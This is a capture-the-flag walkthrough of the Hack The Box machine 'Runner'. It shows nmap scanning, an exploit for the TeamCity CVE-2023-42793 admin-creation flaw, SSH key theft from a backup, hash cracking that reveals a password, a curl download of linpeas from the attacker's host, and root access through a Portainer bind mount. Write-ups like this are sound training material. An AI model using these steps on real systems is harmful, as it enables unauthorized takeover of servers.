# Runner

<figure><img src="../../.gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>

## Enumeration

```bash
nmap -v -A -p- -Pn runner.htb -oN nmap
```

```bash
Nmap scan report for runner.htb (10.10.11.13)
Host is up (0.049s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http        nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Runner - CI/CD Specialists
8000/tcp open  nagios-nsca Nagios NSCA
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=5/22%OT=22%CT=1%CU=42865%PV=Y%DS=2%DC=T%G=Y%TM=664D
OS:FAC7%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)
OS:OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53C
OS:ST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
OS:ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
OS:%CD=S)

Uptime guess: 19.482 days (since Fri May  3 04:27:54 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   47.95 ms 10.10.14.1
2   48.01 ms runner.htb (10.10.11.13)

NSE: Script Post-scanning.
Initiating NSE at 16:01
Completed NSE at 16:01, 0.00s elapsed
Initiating NSE at 16:01
Completed NSE at 16:01, 0.00s elapsed
Initiating NSE at 16:01
Completed NSE at 16:01, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.29 seconds
           Raw packets sent: 65811 (2.900MB) | Rcvd: 65640 (2.629MB)
```

### Port 80

<figure><img src="../../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>

If we try to enumerate directories or files present we get nothing with generic wordlists. Instead, by generating a custom wordlist with `cewl` from the website pages we get an interesting result:

```bash
cewl -d 2 -m 3 http://runner.htb -w wordlist.txt --lowercase
```

<figure><img src="../../.gitbook/assets/image (691).png" alt=""><figcaption></figcaption></figure>

Now add the new subdomain enumerated in /etc/hosts and continue enumeration...

<figure><img src="../../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>

We also find on the Jetbrains site the [CVE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-42793) listed and from which version onward it was fixed:

<figure><img src="../../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>

## Exploitation (foothold)

The exploit simply relies on interacting with some APIs that do not involve authentication in order to create an administrator user even without being authenticated on a TeamCity server. It sends a POST request to the target URL to create an admin user with specified or random credentials.

{% code overflow="wrap" %}
```bash
python3 exploit.py -u http://teamcity.runner.htb -v -n lilpil -p password1_ -e lilpil@runner.htb -t token.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>

If we now login using these credentials we obtain a success. In particular, under "Users" section we see there are `Matthew` and `John` users:

<figure><img src="../../.gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>

There also appears to be a Backup section within the administrative console that allows you to download a backup of everything as shown in the figure:

<figure><img src="../../.gitbook/assets/image (104).png" alt=""><figcaption></figcaption></figure>

Unzipping the directory and exploring it we will find an id\_rsa key file:

<figure><img src="../../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>

If we try to SSH as matthew we obtain an error instead as john is a success and we can get the user flag:

<figure><img src="../../.gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>

Within the downloaded backup, however, there is also a database\_dump folder containing a users file with hashes of TeamCity users:

<figure><img src="../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

If we try to crack it using Hashcat:

{% code overflow="wrap" %}
```bash
hashcat -m 3200 matthew.hash /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

We will obtain also matthew credentials: `matthew` <-->`piper123`

Login as matthew using SSH or su from John console do not work...

<figure><img src="../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

## Enumeration

Download using curl (wget is not present on the machine) the linpeas from attacking machine and run it:

```
curl http://10.10.15.101:8888/linpeas.sh -o linpeas.sh && chmod 777 linpeas.sh
```

<figure><img src="../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

There is a configuration on the nginx server that exposes another website: `portainer-administration.runner.htb`

<figure><img src="../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

Trying matthew credentials (are the only ones we know!) we can login:

<figure><img src="../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
<mark style="color:yellow;">**Portainer**</mark> is a graphical container management platform that facilitates the process of managing, monitoring and maintaining Docker and Kubernetes environments. It allows users to manage their containerized applications through a simple web user interface, without the need to use the command line.
{% endhint %}

In Portainer, an “environment” represents a managed instance of a container orchestration platform, such as Docker or Kubernetes. An environment can be a single machine with Docker installed, a Kubernetes cluster, a Docker Swarm instance, or a remote Docker instance. There are different types of Environment in Portainer, the one we find configured is a Docker Standalone i.e. a single Docker node.

<figure><img src="../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

There are 0 running containers but 2 locally downloaded images are present:

<figure><img src="../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

If we try to download another image like `node` we will obtain an error:

<figure><img src="../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

A very quick privilege escalation would have been to create a container in privilege mode. The <mark style="color:yellow;">**privileged mode**</mark> of a Docker container is a mode that grants the container more privileges than the default privileges. When a container is run in privileged mode, it gains access to all the capabilities of the host kernel, which means it can do almost anything the host operating system can do including:

* The container can access all devices on the host system, including network devices, storage devices, and other
* The container has access to all kernel capabilities, allowing operations that would normally be restricted or prohibited for unprivileged containers
* The container can mount filesystems from the host system
* The container can upload and download kernel modules
* The container can modify various system and network parameters, similar to how a root user would do on the host system.

However, since user matthew is not the administrator of portainer.io it would appear to have been disabled:

<figure><img src="../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (692).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://medium.com/@moein.moeinnia/understanding-docker-mounts-volumes-bind-mounts-and-tmpfs-f992185edc27" %}

{% hint style="info" %}
By default <mark style="color:yellow;">**host directories**</mark> are not available in the _**container file system**_ , but with bind mounts we can access the host filesystem. bind mount is a way to connect or link a directory or file from your computer’s file system to a specific location inside a Docker container.

You can easily update the files on your computer, and the changes will be instantly reflected inside the container **without the need to rebuild or modify the container itself.**

Bind mounts tightly couple the container to the host machine’s filesystem, which means that processes running in a container **can** **modify the host filesystem**. This includes creating, modifying, or deleting system files or directories. Therefore, it is crucial to be cautious with permissions and ensure proper access controls to prevent any security risks or conflicts.
{% endhint %}



However, if we try to create a volume from the Volumes section. There are several options that can be set when creating the volume. One of them is the Bind Mounts type.

<figure><img src="../../.gitbook/assets/image (693).png" alt=""><figcaption></figcaption></figure>

you need to specify the type `bind`:

<figure><img src="../../.gitbook/assets/image (698).png" alt=""><figcaption></figcaption></figure>

Now we can finally create the container mapping host file system inside the container file system:



<figure><img src="../../.gitbook/assets/image (695).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (696).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (697).png" alt=""><figcaption></figcaption></figure>

Opening the console we can root the machine :tada:

<figure><img src="../../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>
